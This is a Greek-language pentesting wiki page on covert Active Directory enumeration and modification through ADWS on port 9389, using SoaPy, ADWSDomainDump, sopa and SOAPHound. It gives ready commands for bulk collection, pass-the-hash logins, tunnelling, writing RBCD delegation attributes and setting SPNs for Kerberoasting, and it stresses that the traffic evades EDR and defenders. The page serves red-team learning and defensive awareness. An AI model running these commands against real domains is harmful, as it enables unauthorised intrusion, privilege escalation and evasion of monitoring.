# Active Directory Web Services (ADWS) Enumeration & Αφανής συλλογή

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Το Active Directory Web Services (ADWS) είναι **ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από το Windows Server 2008 R2 και μετά** και ακούει στη θύρα TCP **9389**. Παρά το όνομά του, **δεν χρησιμοποιείται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα τύπου LDAP μέσω μιας στοίβας ιδιόκτητων πρωτοκόλλων framing του .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση ενθυλακώνεται σε αυτά τα δυαδικά SOAP frames και μεταφέρεται μέσω μιας ασυνήθιστης θύρας, η **enumeration μέσω ADWS είναι πολύ λιγότερο πιθανό να επιθεωρηθεί, να φιλτραριστεί ή να εντοπιστεί μέσω signatures σε σύγκριση με την κλασική κίνηση LDAP/389 & 636**. Για τους operators, αυτό σημαίνει:<sup>[[1]](#references)[[7]](#references)</sup>

* Πιο αφανές recon – οι Blue teams συχνά εστιάζουν στα LDAP queries.
* Δυνατότητα συλλογής δεδομένων από **hosts που δεν εκτελούν Windows (Linux, macOS)** μέσω tunnelling της θύρας 9389/TCP από SOCKS proxy.
* Τα ίδια δεδομένα που θα λαμβάνατε μέσω LDAP (users, groups, ACLs, schema κ.λπ.), καθώς και η δυνατότητα εκτέλεσης **εγγραφών** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις με το ADWS υλοποιούνται μέσω WS-Enumeration: κάθε query ξεκινά με ένα μήνυμα `Enumerate` που ορίζει το LDAP filter/τα attributes και επιστρέφει ένα GUID `EnumerationContext`, ενώ ακολουθεί ένα ή περισσότερα μηνύματα `Pull` που μεταφέρουν έως το όριο αποτελεσμάτων που ορίζει ο server.<sup>[[7]](#references)</sup> Τα contexts λήγουν μετά από περίπου 30 λεπτά, επομένως τα εργαλεία πρέπει είτε να κάνουν σελιδοποίηση των αποτελεσμάτων είτε να χωρίζουν τα filters (queries προθέματος ανά CN) για να μην χαθεί η κατάστασή τους.<sup>[[8]](#references)</sup> Όταν ζητάτε security descriptors, καθορίστε το control `LDAP_SERVER_SD_FLAGS_OID` για να παραλείψετε τα SACLs· διαφορετικά, το ADWS απλώς αφαιρεί το attribute `nTSecurityDescriptor` από την SOAP απόκρισή του.

> ΣΗΜΕΙΩΣΗ: Το ADWS χρησιμοποιείται επίσης από πολλά εργαλεία RSAT GUI/PowerShell, επομένως η κίνηση μπορεί να μοιάζει με νόμιμη δραστηριότητα διαχείρισης.

## SoaPy – Native Python Client

Το [SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επανυλοποίηση της στοίβας πρωτοκόλλων ADWS σε καθαρή Python**. Δημιουργεί τα frames NBFX/NBFSE/NNS/NMF byte προς byte, επιτρέποντας τη συλλογή δεδομένων από συστήματα τύπου Unix χωρίς χρήση του .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Βασικές δυνατότητες

* Υποστηρίζει **proxying μέσω SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερή search filters, πανομοιότυπα με το LDAP `-q '(objectClass=user)'`.
* Προαιρετικές λειτουργίες **εγγραφής** (`--set` / `--delete`).
* **Λειτουργία εξόδου BOFHound** για απευθείας εισαγωγή στο BloodHound.<sup>[[3]](#references)</sup>
* Το flag `--parse` μορφοποιεί timestamps / `userAccountControl` για ευκολότερη ανάγνωση από ανθρώπους.<sup>[[2]](#references)</sup>

### Flags στοχευμένης συλλογής & λειτουργίες εγγραφής

Το SoaPy περιλαμβάνει επιλεγμένα switches που αναπαράγουν τις συνηθέστερες εργασίες LDAP hunting μέσω ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και τα raw `--query` / `--filter` για προσαρμοσμένα pulls. Συνδυάστε τα με write primitives όπως `--rbcd <source>` (ορίζει το `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (προετοιμασία SPN για στοχευμένο Kerberoasting) και `--asrep` (ενεργοποιεί το `DONT_REQ_PREAUTH` στο `userAccountControl`).<sup>[[2]](#references)</sup>

Παράδειγμα στοχευμένου SPN hunt που επιστρέφει μόνο τα `samAccountName` και `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Χρησιμοποιήστε το ίδιο host/credentials για να αξιοποιήσετε άμεσα τα ευρήματα: κάντε dump των αντικειμένων που υποστηρίζουν RBCD με `--rbcds` και, στη συνέχεια, εφαρμόστε τα `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να προετοιμάσετε μια αλυσίδα Resource-Based Constrained Delegation (δείτε το [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδικασία abuse).

### Εγκατάσταση (host χειριστή)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump μέσω ADWS (Linux/Windows)

* Fork του `ldapdomaindump` που αντικαθιστά τα ερωτήματα LDAP με κλήσεις ADWS μέσω TCP/9389, για να μειώσει τις ανιχνεύσεις υπογραφών LDAP.
* Εκτελεί αρχικό έλεγχο προσβασιμότητας στη θύρα 9389, εκτός αν περαστεί η παράμετρος `--force` (παραλείπει τον έλεγχο αν οι σαρώσεις θυρών προκαλούν θόρυβο ή φιλτράρονται).
* Δοκιμάστηκε έναντι των Microsoft Defender for Endpoint και CrowdStrike Falcon, με επιτυχημένο bypass σύμφωνα με το README.<sup>[[4]](#references)</sup>

### Εγκατάσταση

```bash
pipx install .
```

### Χρήση

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Το τυπικό output καταγράφει τον έλεγχο reachability της θύρας 9389, το bind στο ADWS και την έναρξη/ολοκλήρωση του dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Ένας πρακτικός client για ADWS σε Golang

Όπως και το soapy, το [sopa](https://github.com/Macmod/sopa) υλοποιεί τη στοίβα πρωτοκόλλων ADWS (MS-NNS + MC-NMF + SOAP) σε Golang και παρέχει flags γραμμής εντολών για την εκτέλεση κλήσεων ADWS, όπως:<sup>[[5]](#references)</sup>

* **Αναζήτηση και ανάκτηση αντικειμένων** - `query` / `get`
* **Κύκλος ζωής αντικειμένων** - `create [user|computer|group|ou|container|custom]` και `delete`
* **Επεξεργασία attributes** - `attr [add|replace|delete]`
* **Διαχείριση λογαριασμών** - `set-password` / `change-password`
* και άλλα, όπως `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` κ.λπ.

### Βασικά σημεία αντιστοίχισης πρωτοκόλλων

* Οι αναζητήσεις τύπου LDAP εκτελούνται μέσω του **WS-Enumeration** (`Enumerate` + `Pull`), με προβολή attributes, έλεγχο scope (Base/OneLevel/Subtree) και σελιδοποίηση.
* Η ανάκτηση ενός αντικειμένου γίνεται μέσω του **WS-Transfer** `Get`· οι αλλαγές attributes μέσω του `Put` και οι διαγραφές μέσω του `Delete`.
* Η δημιουργία ενσωματωμένων αντικειμένων γίνεται μέσω του **WS-Transfer ResourceFactory**· για custom αντικείμενα χρησιμοποιείται ένα **IMDA AddRequest** που βασίζεται σε YAML templates.
* Οι λειτουργίες κωδικών πρόσβασης είναι ενέργειες **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ανακάλυψη metadata χωρίς έλεγχο ταυτότητας (mex)

Το ADWS εκθέτει το WS-MetadataExchange χωρίς διαπιστευτήρια, παρέχοντας έναν γρήγορο τρόπο για να επαληθεύσετε την έκθεση πριν από τον έλεγχο ταυτότητας:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Σημειώσεις για ανακάλυψη DNS/DC και στόχευση Kerberos

Το Sopa μπορεί να εντοπίσει DC μέσω SRV, αν παραλειφθεί το `--dc` και δοθεί το `--domain`. Υποβάλλει ερωτήματα με την εξής σειρά και χρησιμοποιεί τον στόχο με την υψηλότερη προτεραιότητα:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Λειτουργικά, προτιμήστε έναν resolver που ελέγχεται από DC, για να αποφύγετε αποτυχίες σε τμηματοποιημένα περιβάλλοντα:

* Χρησιμοποιήστε `--dns <DC-IP>` ώστε **όλες** οι αναζητήσεις SRV/PTR/forward να γίνονται μέσω του DNS του DC.
* Χρησιμοποιήστε `--dns-tcp` όταν το UDP είναι αποκλεισμένο ή οι απαντήσεις SRV είναι μεγάλες.
* Αν είναι ενεργοποιημένο το Kerberos και το `--dc` είναι IP, το sopa εκτελεί ένα **reverse PTR** για να λάβει ένα FQDN, ώστε να στοχεύσει σωστά το SPN/KDC. Αν δεν χρησιμοποιείται Kerberos, δεν γίνεται αναζήτηση PTR.

Παράδειγμα (IP + Kerberos, εξαναγκασμένη χρήση DNS μέσω του DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Επιλογές υλικού αυθεντικοποίησης

Εκτός από κωδικούς πρόσβασης απλού κειμένου, το sopa υποστηρίζει **NT hashes**, **Kerberos AES keys**, **ccache** και **PKINIT certificates** (PFX ή PEM) για αυθεντικοποίηση ADWS. Η χρήση των `--aes-key`, `-c` (ccache) ή επιλογών που βασίζονται σε certificates συνεπάγεται Kerberos.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Δημιουργία προσαρμοσμένων αντικειμένων μέσω templates

Για αυθαίρετες κλάσεις αντικειμένων, η εντολή `create custom` χρησιμοποιεί ένα YAML template που αντιστοιχίζεται σε ένα IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* Τα `parentDN` και `rdn` ορίζουν το container και το σχετικό DN.
* Το `attributes[].name` υποστηρίζει `cn` ή το namespaced `addata:cn`.
* Το `attributes[].type` δέχεται `string|int|bool|base64|hex` ή ρητό `xsd:*`.
* **Μην** συμπεριλάβετε τα `ad:relativeDistinguishedName` ή `ad:container-hierarchy-parent`· το sopa τα προσθέτει αυτόματα.
* Οι τιμές `hex` μετατρέπονται σε `xsd:base64Binary`· χρησιμοποιήστε `value: ""` για να ορίσετε κενές συμβολοσειρές.

## SOAPHound – Συλλογή AD μεγάλου όγκου μέσω ADWS (Windows)

Το [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας collector .NET που διατηρεί όλες τις αλληλεπιδράσεις LDAP εντός του ADWS και παράγει JSON συμβατό με το BloodHound v4. Δημιουργεί μία φορά μια πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` (`--buildcache`) και στη συνέχεια την επαναχρησιμοποιεί για διελεύσεις `--bhdump`, `--certdump` (ADCS) ή `--dnsdump` (DNS ενσωματωμένο στο AD) μεγάλου όγκου, ώστε μόνο περίπου 35 κρίσιμα attributes να αποχωρούν ποτέ από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) κατακερματίζει αυτόματα τα queries βάσει προθέματος CN, ώστε να παραμένουν εντός του χρονικού ορίου των 30 λεπτών για το EnumerationContext σε μεγάλα forests.<sup>[[8]](#references)</sup>

Συνήθης ροή εργασίας σε ένα domain-joined VM χειριστή:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Το JSON που εξάγεται ενσωματώνεται απευθείας στα workflows του SharpHound/BloodHound—δείτε το [BloodHound methodology](bloodhound.md) για ιδέες σχετικά με τη downstream απεικόνιση γράφων. Το AutoSplit κάνει το SOAPHound ανθεκτικό σε forests με εκατομμύρια αντικείμενα, διατηρώντας παράλληλα χαμηλότερο αριθμό queries από τα snapshots τύπου ADExplorer.

## Workflow stealth συλλογής AD

Το παρακάτω workflow δείχνει πώς να κάνετε enumerate **αντικείμενα domain & ADCS** μέσω ADWS, να τα μετατρέψετε σε JSON του BloodHound και να αναζητήσετε attack paths που βασίζονται σε certificates – όλα από Linux:

1. **Δημιουργήστε tunnel για το 9389/TCP** από το δίκτυο-στόχο προς το μηχάνημά σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward κ.λπ.). Κάντε export με `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε τις επιλογές `--proxyHost/--proxyPort` του SoaPy.

2. **Συλλέξτε το αντικείμενο του root domain:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Συλλέξτε αντικείμενα που σχετίζονται με το ADCS από το Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Μετατροπή σε BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Ανεβάστε το ZIP** στο GUI του BloodHound και εκτελέστε cypher queries όπως το `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να εντοπίσετε διαδρομές κλιμάκωσης μέσω πιστοποιητικών (ESC1, ESC8 κ.λπ.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Συνδυάστε το με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη αλυσίδα **Resource-Based Constrained Delegation** (δείτε [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Σύνοψη εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|---------|------|-------|
| Enumeration μέσω ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, ανάγνωση/εγγραφή |
| ADWS dump μεγάλου όγκου | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, λειτουργίες BH/ADCS/DNS |
| Εισαγωγή στο BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει logs των SoaPy/ldapsearch |
| Παραβίαση πιστοποιητικών | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να δρομολογηθεί μέσω του ίδιου SOCKS |
| Enumeration μέσω ADWS και αλλαγές αντικειμένων | [sopa](https://github.com/Macmod/sopa) | Γενικός client για διασύνδεση με γνωστά ADWS endpoints — επιτρέπει enumeration, δημιουργία αντικειμένων, τροποποίηση attributes και αλλαγές κωδικών πρόσβασης |

## References

- [1] [SpecterOps – Φροντίστε να χρησιμοποιείτε το SOAP(y) – Οδηγός χειριστή για stealthy συλλογή δεδομένων AD μέσω ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy στο GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound στο GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump στο GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa στο GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Προδιαγραφές MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Stealthy enumeration περιβαλλόντων Active Directory μέσω ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Εργαλείο SOAPHound για συλλογή δεδομένων Active Directory μέσω ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
